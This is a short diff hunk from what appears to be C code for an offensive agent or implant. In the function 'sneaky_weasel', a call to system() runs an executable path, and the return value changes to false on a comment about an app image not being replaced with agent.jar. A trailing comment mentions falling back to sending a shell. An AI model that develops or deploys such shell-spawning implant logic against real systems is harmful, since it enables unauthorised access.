@@ -105,7 +105,8 @@ bool sneaky_weasel()
     debug("system()", "Hold thumbs...we are attempting to run it...");
     system(execPath);
     
-    return true;
+    /* If this is reached it means that the app image was not replaced with that of agent.jar */
+    return false;
 }
 
 /* If all the other techniques have failed, send a shell */
